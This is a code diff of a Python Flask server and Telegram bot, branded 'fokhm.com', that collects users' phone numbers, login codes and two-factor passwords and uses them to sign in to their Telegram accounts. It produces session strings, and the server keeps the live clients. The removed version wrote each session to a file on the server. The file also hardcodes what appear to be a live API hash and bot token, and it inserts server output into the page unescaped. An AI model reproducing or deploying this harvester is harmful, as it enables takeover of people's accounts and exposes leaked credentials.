@@ -1,29 +1,30 @@
-from flask import Flask, render_template_string, request, redirect, url_for, session as flask_session
+from flask import Flask, render_template_string, request
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 import asyncio
 import os
 import threading
-from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
-from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
+from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
 
 app = Flask(__name__)
-app.secret_key = 'fokhm_super_secret_key_2026'
 
 API_ID = 25757508
 API_HASH = '3091fbda91d4b133207779ddf81fee39'
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")
 
-# تخزين مؤقت لأرقام الهواتف وجلسات تيليثون قيد الإنشاء
-user_sessions = {}
+# تخزين مؤقت لجلسات تيليثون قيد التشغيل لكل مستخدم
+active_sessions = {}
 
-HTML_PAGE = """
+# واجهة تطبيق الويب المصغر (Telegram Web App)
+WEB_APP_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل دخول فخم - fokhm.com</title>
+    <title>منصة fokhm.com - استخراج الجلسة</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background-color: #0f172a; color: #fff; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); width: 320px; text-align: center; }
@@ -31,136 +32,181 @@ HTML_PAGE = """
         button { width: 95%; padding: 10px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 10px; }
         button:hover { background: #1d4ed8; }
         .msg { color: #f87171; font-size: 14px; margin-bottom: 10px; }
+        .success { color: #4ade80; font-size: 14px; word-break: break-all; background: #0f172a; padding: 10px; border-radius: 6px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>منصة fokhm.com</h2>
-        {% if error %}<div class="msg">{{ error }}</div>{% endif %}
-        
-        {% if step == 'code' %}
-        <form method="POST">
-            <p>أدخل رمز التحقق (OTP) الذي وصلك على تيليجرام:</p>
-            <input type="text" name="code" placeholder="12345" required>
-            <button type="submit">تأكيد وتسجيل الدخول</button>
-        </form>
-        {% elif step == 'password' %}
-        <form method="POST">
-            <p>الحساب محمي بتحقق ثنائي (2FA)، أدخل كلمة المرور:</p>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
-            <button type="submit">تحقق</button>
-        </form>
-        {% elif step == 'done' %}
-        <h3 style="color: #4ade80;">✅ تمت العملية بنجاح يا فخم!</h3>
-        <p>تم استخراج الجلسة وحفظها بنجاح.</p>
-        {% endif %}
+        <h2>فخم - استخراج الجلسة</h2>
+        <div id="content">
+            <p>انقر أدناه لمشاركة رقم هاتفك وبدء العملية:</p>
+            <button onclick="requestPhone()">📱 مشاركة رقم الهاتف</button>
+        </div>
     </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+
+        function requestPhone() {
+            if (tg.requestContact) {
+                tg.requestContact((shared, contact) => {
+                    if (shared && contact) {
+                        sendDataToBackend('phone', '+' + contact.phone_number);
+                    } else {
+                        alert("عذراً، يجب مشاركة الرقم للمتابعة.");
+                    }
+                });
+            } else {
+                // بديل في حال المتصفح الخارجي
+                let phone = prompt("أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):");
+                if (phone) sendDataToBackend('phone', phone);
+            }
+        }
+
+        function sendDataToBackend(action, value, extra = "") {
+            fetch('/api', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    action: action, 
+                    value: value, 
+                    extra: extra,
+                    user_id: tg.initDataUnsafe?.user?.id || 'web_user'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                let html = '';
+                if (data.status === 'need_code') {
+                    html = `<p>أدخل رمز التحقق (OTP) الذي وصلك:</p>
+                            <input type="text" id="code_val" placeholder="12345">
+                            <button onclick="submitCode()">تأكيد الكود</button>`;
+                } else if (data.status === 'need_password') {
+                    html = `<p>الحساب محمي بتحقق ثنائي (2FA)، أدخل كلمة المرور:</p>
+                            <input type="password" id="pass_val" placeholder="كلمة المرور">
+                            <button onclick="submitPassword()">تأكيد كلمة المرور</button>`;
+                } else if (data.status === 'done') {
+                    html = `<h3 style="color: #4ade80;">✅ تمت العملية بنجاح!</h3>
+                            <p>هذه هي جلسة حسابك (انسخها واحفظها مكان آمن):</p>
+                            <div class="success">${data.session}</div>`;
+                } else {
+                    html = `<p class="msg">${data.message}</p><button onclick="location.reload()">إعادة المحاولة</button>`;
+                }
+                document.getElementById('content').innerHTML = html;
+            });
+        }
+
+        function submitCode() {
+            let code = document.getElementById('code_val').value;
+            sendDataToBackend('code', code);
+        }
+
+        function submitPassword() {
+            let pass = document.getElementById('pass_val').value;
+            sendDataToBackend('password', pass);
+        }
+    </script>
 </body>
 </html>
 """
 
 @app.route('/')
 def home():
-    return "🚀 موقع fokhm.com يعمل بنجاح وسيرفر المصادقة جاهز!"
+    return render_template_string(WEB_APP_HTML)
 
-@app.route('/auth/<phone_num>', methods=['GET', 'POST'])
-def auth_web(phone_num):
-    global user_sessions
-    step = flask_session.get('step', 'code')
-    error = None
+@app.route('/api', methods=['POST'])
+def api():
+    global active_sessions
+    data = request.json
+    action = data.get('action')
+    value = data.get('value')
+    user_id = str(data.get('user_id'))
 
-    if phone_num not in user_sessions and step == 'code':
-        try:
+    try:
+        if action == 'phone':
+            phone = value
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
             loop.run_until_complete(client.connect())
-            hash_val = loop.run_until_complete(client.send_code_request(phone_num))
             
-            user_sessions[phone_num] = {
+            sent_code = loop.run_until_complete(client.send_code_request(phone))
+            
+            active_sessions[user_id] = {
                 'client': client,
-                'hash': hash_val,
-                'loop': loop
+                'loop': loop,
+                'phone': phone,
+                'hash': sent_code.phone_code_hash
             }
-        except Exception as e:
-            error = f"حدث خطأ في إرسال الكود: {e}"
+            return {"status": "need_code"}
 
-    if request.method == 'POST':
-        data = user_sessions.get(phone_num)
-        if not data:
-            return "انتهت الجلسة، الرجاء البدء من جديد عبر البوت."
-        
-        client = data['client']
-        loop = data['loop']
-        
-        if step == 'code':
-            code = request.form['code']
+        elif action == 'code':
+            session_data = active_sessions.get(user_id)
+            if not session_data:
+                return {"status": "error", "message": "انتهت الجلسة، اعد المحاولة."}
+            
+            client = session_data['client']
+            loop = session_data['loop']
+            code = value
+            
             try:
-                loop.run_until_complete(client.sign_in(phone_num, code, phone_code_hash=data['hash']))
-                flask_session['step'] = 'done'
+                loop.run_until_complete(client.sign_in(session_data['phone'], code, phone_code_hash=session_data['hash']))
                 session_str = client.session.save()
-                with open(f"session_{phone_num}.txt", "w") as f:
-                    f.write(session_str)
+                return {"status": "done", "session": session_str}
             except Exception as e:
                 if "SessionPasswordNeededError" in str(e):
-                    flask_session['step'] = 'password'
+                    return {"status": "need_password"}
                 else:
-                    error = f"خطأ في الرمز: {e}"
-        elif step == 'password':
-            password = request.form['password']
+                    return {"status": "error", "message": str(e)}
+
+        elif action == 'password':
+            session_data = active_sessions.get(user_id)
+            if not session_data:
+                return {"status": "error", "message": "انتهت الجلسة."}
+            
+            client = session_data['client']
+            loop = session_data['loop']
+            password = value
+            
             try:
                 loop.run_until_complete(client.sign_in(password=password))
-                flask_session['step'] = 'done'
                 session_str = client.session.save()
-                with open(f"session_{phone_num}.txt", "w") as f:
-                    f.write(session_str)
+                return {"status": "done", "session": session_str}
             except Exception as e:
-                error = f"كلمة المرور خاطئة: {e}"
+                return {"status": "error", "message": f"كلمة المرور خطأ: {e}"}
 
-    step = flask_session.get('step', 'code')
-    return render_template_string(HTML_PAGE, step=step, error=error)
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
-# --- أوامر بوت تيليجرام ---
+    return {"status": "error", "message": "طلب غير معروف"}
+
+# --- أوامر بوت تيليجرام لفتح الـ Web App ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    button = KeyboardButton("📱 مشاركة رقم الهاتف", request_contact=True)
-    reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
-    await update.message.reply_text(
-        "أهلاً بك يا فخم في بوت استخراج الجلسات الخاصة بـ fokhm.com\n\nاضغط على الزر بالأسفل لمشاركة رقم هاتفك:",
-        reply_markup=reply_markup
-    )
-
-async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    contact = update.message.contact
-    if contact:
-        phone = contact.phone_number
-        if not phone.startswith('+'):
-            phone = '+' + phone
-            
-        base_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
-        if not base_url.startswith('http'):
-            base_url = f"https://{base_url}"
-            
-        webapp_url = f"{base_url}/auth/{phone.replace('+', '')}"
+    web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
+    if not web_url.startswith('http'):
+        web_url = f"https://{web_url}"
         
-        await update.message.reply_text(
-            f"✅ تم استلام رقمك بنجاح:\n`{phone}`\n\nاضغط على الرابط التالي لإدخال كود التحقق واستخراج الجلسة:\n{webapp_url}",
-            parse_mode="Markdown"
-        )
+    keyboard = [[InlineKeyboardButton("🚀 فتح تطبيق استخراج الجلسة", web_app=WebAppInfo(url=web_url))]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لفتح تطبيق الويب وتسجيل الدخول بسلاسة:",
+        reply_markup=reply_markup,
+        parse_mode="Markdown"
+    )
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)
 
 if __name__ == '__main__':
-    # تشغيل سيرفر الويب في الخلفية ليبقى الرابط شغالاً دائماً
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
     
-    # تشغيل بوت تيليجرام في الخيط الرئيسي لتجنب خطأ الـ signals
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     
-    print("Telegram Bot & Flask Web Server are running...")
+    print("Fokhm WebApp Bot is running...")
     application.run_polling()
 
